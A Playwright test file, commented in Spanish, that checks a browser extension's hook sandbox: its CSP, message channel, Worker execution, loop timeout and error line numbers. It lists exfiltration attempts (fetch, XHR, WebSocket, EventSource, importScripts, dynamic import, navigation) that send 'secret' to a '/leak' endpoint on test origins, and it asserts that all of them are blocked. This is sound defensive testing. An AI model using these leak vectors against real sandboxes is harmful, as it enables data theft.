import type { Page } from "@playwright/test";
import { openApp, openPanel, tabIdOf } from "../fixtures/panel.ts";
import { expect, test } from "../fixtures/extension.ts";
import { saveResult } from "./cdp-lab.ts";

// 006-X1 (research R2): ¿la página sandbox de hooks carga bajo su CSP, abre el canal sin
// `targetOrigin "*"`, crea Workers desde un Blob con `new Function`, bloquea la red y `chrome`,
// corta un bucle con terminate() y conserva la línea de un error?

type ProbeResult = { ok: boolean; value?: string; name?: string; message?: string; stack?: string };

/** Crea el iframe en el panel, espera el `hello` y deja una función `probe` en `window`. */
async function mountSandbox(panel: Page) {
  return panel.evaluate(async () => {
    const iframe = document.createElement("iframe");
    iframe.src = "/src/sandbox/hook-sandbox.html";
    iframe.hidden = true;
    const hello = new Promise<{
      origin: string;
      sameSource: boolean;
      data: unknown;
      port: MessagePort;
    }>((resolve) => {
      window.addEventListener("message", function onMessage(event) {
        window.removeEventListener("message", onMessage);
        resolve({
          origin: event.origin,
          sameSource: event.source === iframe.contentWindow,
          data: event.data,
          port: event.ports[0] as MessagePort,
        });
      });
    });
    document.body.append(iframe);
    const { origin, sameSource, data, port } = await hello;
    let next = 0;
    const pending = new Map<number, (value: unknown) => void>();
    port.onmessage = (event) => pending.get(event.data.id)?.(event.data.result);
    (window as unknown as { probe: unknown }).probe = (where: string, code: string, ms = 2000) =>
      new Promise((resolve) => {
        const id = ++next;
        pending.set(id, resolve);
        port.postMessage({ type: "probe", id, where, code, ms });
      });
    return { origin, sameSource, data };
  });
}

const probe = (panel: Page, where: "worker" | "page", code: string, ms = 2000) =>
  panel.evaluate(
    ([w, c, m]) =>
      (window as unknown as { probe(w: string, c: string, m: number): Promise<ProbeResult> }).probe(
        w,
        c,
        m,
      ),
    [where, code, ms] as const,
  ) as Promise<ProbeResult>;

test("X1: sandbox de hooks, canal, Worker, red bloqueada y corte", async ({
  context,
  nahualWorker,
  extensionId,
  servers,
}) => {
  await openApp(context, servers.appOrigin);
  const tabId = await tabIdOf(nahualWorker, `${servers.appOrigin}/`);
  const panel = await openPanel(context, extensionId, tabId);
  const csp: string[] = [];
  panel.on("console", (m) => {
    if (/Content Security Policy|Refused/i.test(m.text())) csp.push(m.text());
  });

  // (a) + (b)
  const hello = await mountSandbox(panel);
  expect(hello.origin).toBe("null");
  expect(hello.sameSource).toBe(true);

  const leak = (path: string) =>
    `${path === "api" ? servers.apiOrigin : servers.thirdOrigin}/leak?d=secret`;
  const vectors: Record<string, string> = {
    fetch: `return fetch(${JSON.stringify(leak("api"))}).then(() => "sent")`,
    xhr: `const x = new XMLHttpRequest(); x.open("GET", ${JSON.stringify(leak("third"))}, false); x.send(); return "sent"`,
    websocket: `new WebSocket(${JSON.stringify(leak("api").replace("http", "ws"))}); return "created"`,
    eventSource: `new EventSource(${JSON.stringify(leak("api"))}); return "created"`,
    importScripts: `importScripts(${JSON.stringify(leak("third"))}); return "imported"`,
    nestedWorker: `new Worker(${JSON.stringify(leak("api"))}); return "created"`,
    chrome: `return typeof chrome === "undefined" ? "undefined" : Object.keys(chrome).join(",")`,
    parent: `return typeof parent === "undefined" ? "undefined" : "defined"`,
    location: `location.href = ${JSON.stringify(leak("api"))}; return "navigated"`,
    dynamicImport: `return import(${JSON.stringify(leak("third"))}).then(() => "imported")`,
  };
  const results: Record<string, ProbeResult> = {};
  for (const [name, code] of Object.entries(vectors)) {
    results[name] = await probe(panel, "worker", code);
  }
  // (c) new Function en el Worker; la página sandbox tampoco tiene red.
  const fn = await probe(panel, "worker", `return new Function("return 6 * 7")()`);
  const pageFetch = await probe(
    panel,
    "page",
    `return fetch(${JSON.stringify(leak("api"))}).then(() => "sent")`,
  );
  // (e) corte de un bucle infinito.
  const started = Date.now();
  const loop = await probe(panel, "worker", "while (true) {}", 300);
  const loopMs = Date.now() - started;
  // (f) línea del error en código evaluado (línea 3 del texto del dev).
  const line = await probe(
    panel,
    "worker",
    `const f = new Function("a", "\\nconst b = 1;\\nthrow new Error('boom ' + a);\\n//# sourceURL=hook.js");\nf(1);`,
  );
  await panel.waitForTimeout(500);
  const leaks = servers.leaks.map((l) => `${l.method} ${l.url}`);

  saveResult("006-x1-sandbox", {
    hello,
    results,
    fn,
    pageFetch,
    loop,
    loopMs,
    line,
    leaks,
    csp,
  });

  expect(fn).toMatchObject({ ok: true, value: "42" });
  expect(loop).toMatchObject({ name: "TimedOut" });
  expect(leaks).toEqual([]);
  // WebSocket y EventSource se crean pero la CSP bloquea la conexión en segundo plano; `location`
  // de un Worker no navega. Para ellos el criterio es `leaks` vacío.
  const silent = new Set(["websocket", "eventSource", "location", "chrome", "parent"]);
  for (const [name, result] of Object.entries(results)) {
    if (name === "chrome" || name === "parent") expect(result.value, name).toBe("undefined");
    else if (!silent.has(name)) expect(result.ok, name).toBe(false);
  }
  // `new Function` añade 2 líneas: la línea 3 del texto del dev sale como hook.js:5.
  expect(line.stack).toContain("hook.js:5:");
  expect(pageFetch.ok).toBe(false);
});
